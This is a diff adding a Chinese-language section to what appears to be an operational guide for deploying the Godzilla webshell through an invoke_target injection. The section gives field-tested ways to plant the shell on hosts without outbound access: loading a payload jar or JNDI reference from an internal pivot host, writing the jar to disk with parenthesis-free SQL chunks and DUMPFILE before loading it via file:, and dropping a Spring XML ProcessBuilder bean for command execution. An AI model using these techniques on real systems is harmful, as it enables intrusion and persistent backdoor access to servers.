@@ -89,3 +89,17 @@ java -Dfile.encoding=UTF-8 -cp "godzilla-cli.jar:Godzilla2-rebuilt.jar" shells.c
 ```
 
 注意：Godzilla2 的 AES key 是 `md5(secretKey)[0:16]` 派生值；换 pass/key 需重打载荷 jar。
+
+## 不出网打法（实测）
+
+解析器硬约束：invoke_target 参数内**禁止右括号 `)`**（`substringBetween` 首个 `)` 截断），逗号在引号内安全。
+
+1. **内网跳板（首选）**：载荷 jar/JNDI 放目标可达的内网资产，`--jar-url http://内网IP/g.jar` / `--jndi ldap://内网IP:1389/...`
+2. **SQL 落盘 + file:// 离线加载**（站库同机）：无右括号 SQL 分块写文件再离线加载，全程零网络：
+   ```sql
+   CREATE TABLE IF NOT EXISTS g SELECT 1 AS i, 0x<块1hex> AS b
+   INSERT INTO g SET i=2, b=0x<块2hex>
+   SELECT b INTO DUMPFILE '/path/g.jar' FROM g ORDER BY i   -- 按序原样拼接
+   ```
+   然后 `--jar-url "file:/path/g.jar"`（已实测进马）。限制：FILE 权限、secure_file_priv、落盘 640 权限需应用可读；站库分离无效
+3. **落盘 Spring XML**（命令执行小文件）：ProcessBuilder bean + init-method，Yaml `FileSystemXmlApplicationContext` 构造即执行（全文无右括号）
